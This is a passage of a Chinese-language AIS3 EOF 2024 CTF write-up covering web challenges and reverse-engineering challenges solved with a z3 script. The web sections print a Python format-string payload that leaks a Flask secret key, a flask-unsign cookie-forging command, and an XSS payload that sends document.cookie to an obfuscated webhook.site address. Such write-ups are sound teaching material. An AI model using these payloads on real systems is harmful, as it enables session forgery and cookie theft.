| 2a7fb2b6-a4e2-4eda-82cb-5f25e5bfa485 |
| 2cc6be38-26e6-4a77-a387-825426c05d04 |
| 38bcdb16-f47f-479f-82f4-ccad7fb4e4c5 |
| 4f7c6bec-2ccd-4f7a-a43c-e479f1b4e4b0 |
| 6b0e91bd-6367-4243-9393-445b2f831b72 |
| 83ad8a59-a6f0-4ecc-bd1d-e9686d6f093a |
| cdcad549-2371-4085-889c-19a2441037c4 |
+--------------------------------------+
```

在賽中我做到這就先去水其他題的分數了, 剩下的是賽後解的.

##### Step2: 利用 format string 偷出 `app.secret_key`

在  `@app.post("/use")` 裡面的  `content.format(field=request.form)` 的 `content` 跟 `request.form` 都可控 (SQLi), 所以可以用來偷 `app.secret_key`. 可以參考 https://book.hacktricks.xyz/generic-methodologies-and-resources/python/python-internal-read-gadgets#flask-read-secret-key , https://book.hacktricks.xyz/generic-methodologies-and-resources/python/python-internal-read-gadgets .

最後我構造出的 payload 如下, 可以確實偷到 `app.secret_key`.

```python
# Initialize the session to make `session['posts'] != None` to prevent 500
s.get(URL)

# To get the secret key
# https://book.hacktricks.xyz/generic-methodologies-and-resources/python/bypass-python-sandboxes#python-format-string
r = s.post(f'''{URL}/use?id={payload.format("_______{field.__init__.__globals__[__loader__].__init__.__globals__[sys].modules[app].app.secret_key}______")}''', data={
    'flag': 'fllll'
})
print(html.unescape(r.text))
```

```
_______c6023e3227c2300ac39a2a23ea9568af______
```



##### Step3. 利用 flask secret 偽造 flask session

https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/flask

`flask-unsign` 這個工具可以用.

```sh
flask-unsign --sign --secret c6023e3227c2300ac39a2a23ea9568af --cookie "{'posts': ['2a7fb2b6-a4e2-4eda-82cb-5f25e5bfa485']}"
eyJwb3N0cyI6WyIyYTdmYjJiNi1hNGUyLTRlZGEtODJjYi01ZjI1ZTViZmE0ODUiXX0.ZZ_ELw.CUOF8jlAeKC-kb9Xf3qL50oaP0U
```

##### Step4. 換上生出來的 cookie, 訪問 `/view/<uuid>` 取得 flag

```
AIS3{1_L0Ve_PaSt@_aNd_c0Pypast@}
```

### HTML Debugger

這題是賽後解的, 利用到的特性是 pupteer 在點擊指定的 element 的時候, 其實會先取得他的座標, 再去點擊那個座標, 所以如果在那上面有其他元素, 就會點到那個元素, 所以把可以 XSS 利用的按鈕用 style (因為有 Dompurify 所以能插入的東西有限) 放到最大最高的地方讓 pupteer 誤點, 再串 Dom Clobbering 來觸發 XSS 的點就拿的到 flag 了.

```html
padding to preserve style tag......
<style>
#form { display: block !important; }
#preview_btn {
    display: block !important ;
    z-index: 100 !important ;
    position: fixed !important ;
    width: 100% !important ;
    height: 100% !important ;
    left: 0% !important ;
    top: 0% !important ;
}
</style>
<a id="html_text"></a>
<a id="res"></a>
<!-- Use cid protocol to prevent our tag being url encoded, use atob to prevent ? from appearing, since it would cause the thing following it to be url encoded too.-->
<a href="cid:<img src=x onerror=location=atob('aHR0cHM6Ly93ZWJob29rLnNpdGUvZGRiZDBkN2EtODQ5NC00ZGJlLWI3NjYtZWVjYjhiMDUwOTFiPw==')+document.cookie;>" id="res" name="text"></a>
```

```
AIS3{CHIP1_Ch1p1_cHap@_cHaP@_DUBi_DUbi_da8a_d4B@}
```





## Rev

### Flag Generator

進來看到題目是對 `Block` 進行一連串的操作之後把結果放到 `writeFile` 裏面，跟進裏面看看。

![flag generator](/ais3-eof-2024-write-up/flag-generator.png)

發現 `writeFile` 根本沒有寫檔，來動態執行把 `Block` 拉出來看看，先下一個斷點在這裏。

![image-20240109110505699](/ais3-eof-2024-write-up/image-20240109110505699.png)

![image-20240109111240619](/ais3-eof-2024-write-up/image-20240109111240619.png)

接著進入 `Block` 的地方，發現是個執行檔，拉出來看看。

![image-20240109111304073](/ais3-eof-2024-write-up/image-20240109111304073.png)

直接執行起來就有 flag 了。

![image-20240109111627758](/ais3-eof-2024-write-up/image-20240109111627758.png)

### stateful

進來看到是一個經典的 flag checker，將使用者的輸入經過 `state_machine` 之後與 `k_target` 進行比較是否一致，如果一致就會說是 correct。跟進 `state_machine` 看看。

![stateful](/ais3-eof-2024-write-up/stateful.png)

#### `state_machine`

進來看到是一個 state machine，跟進 `state_4260333374` 看看。

![state machine](/ais3-eof-2024-write-up/state-machine.png)

####  `state_4260333374` 

進來看到是對我們的輸入進行操作，到其他的 state function 裏面去看也都是類似的操作。所以我們要做的是模擬 state machine 來解出 flag。

![image-20240109104544875](/ais3-eof-2024-write-up/image-20240109104544875.png)

#### 模擬 state machine

將 IDA decompiled 的 code 複製出來到 VSCode，利用 find and replace 將呼叫 function 的部分替換成 `cout`，再去執行就會有 state function 的呼叫順序。

![image-20240109104854992](/ais3-eof-2024-write-up/image-20240109104854992.png)

BTW，我 find and replace 用的像是這樣。

![ ](/ais3-eof-2024-write-up/image-20240109105546793.webp)

有呼叫順序后，再將對應 state function 所作的事情寫出來，大概會像這樣：

![image-20240109105716736](/ais3-eof-2024-write-up/image-20240109105716736.png)

接著把前面的 `k_target` 拉出來，再用 z3 來解出原本的 flag。

```python
k_target = bytes.fromhex('F51ACC330216F4566B4265755F87F1A11BAD2A90FA716C122B525F2D37405B0880335373E33A74A033CC7D')

from z3 import *
from IPython import embed

# https://lebr0nli.github.io/blog/security/Z3-Theorem-Prover/
flag = [BitVec(f"f_{i}", 8) for i in range(len(k_target))]
s = Solver()

for i, c in enumerate(b"AIS3{"):
    s.add(flag[i] == c)
s.add(flag[-1] == ord("}"))

flag_init = flag.copy()

flag[14] += flag[35] + flag[8]
flag[9] -= flag[2] + flag[22]
flag[0] -= flag[18] + flag[31]
flag[2] += flag[11] + flag[8]
flag[6] += flag[10] + flag[41]
flag[14] -= flag[32] + flag[6]
flag[16] += flag[25] + flag[11]
flag[31] += flag[34] + flag[16]
flag[9] += flag[11] + flag[3]
flag[17] += flag[0] + flag[7]
flag[5] += flag[40] + flag[4]
flag[37] -= flag[29] + flag[3]
flag[23] += flag[7] + flag[34]
flag[39] -= flag[25] + flag[38]
flag[27] += flag[18] + flag[20]
flag[20] += flag[19] + flag[24]
flag[15] += flag[22] + flag[10]
flag[30] -= flag[33] + flag[8]
flag[1] -= flag[29] + flag[13]
flag[19] += flag[10] + flag[16]
flag[0] += flag[33] + flag[16]
flag[36] += flag[11] + flag[15]
flag[24] += flag[20] + flag[5]
flag[7] += flag[21] + flag[0]
flag[1] += flag[15] + flag[6]
flag[30] -= flag[13] + flag[2]
flag[1] += flag[16] + flag[40]
flag[31] += flag[1] + flag[16]
flag[32] += flag[5] + flag[25]
flag[13] += flag[25] + flag[28]
flag[7] += flag[10] + flag[0]
flag[21] += flag[34] + flag[15]
flag[21] -= flag[13] + flag[42]
flag[18] += flag[29] + flag[15]
flag[4] += flag[7] + flag[25]
flag[0] += flag[28] + flag[31]
flag[2] += flag[34] + flag[25]
flag[13] += flag[26] + flag[8]
flag[41] -= flag[3] + flag[34]
flag[37] += flag[27] + flag[18]
flag[4] += flag[27] + flag[25]
flag[23] += flag[30] + flag[39]
flag[18] += flag[26] + flag[31]
flag[10] -= flag[12] + flag[22]
flag[4] += flag[6] + flag[22]
flag[37] += flag[12] + flag[16]
flag[15] += flag[40] + flag[8]
flag[17] += flag[38] + flag[24]
flag[8] += flag[14] + flag[16]
flag[5] += flag[37] + flag[20]

for i, c in enumerate(k_target):
    s.add(flag[i] == c)

assert s.check() == sat
m = s.model()
flag = bytes([m[x].as_long() for x in flag_init]).decode()
print(flag) # AIS3{4re_Y0u_@_sTAtEfUl_OR_S7@TeL3Ss_Ctf3R}
```
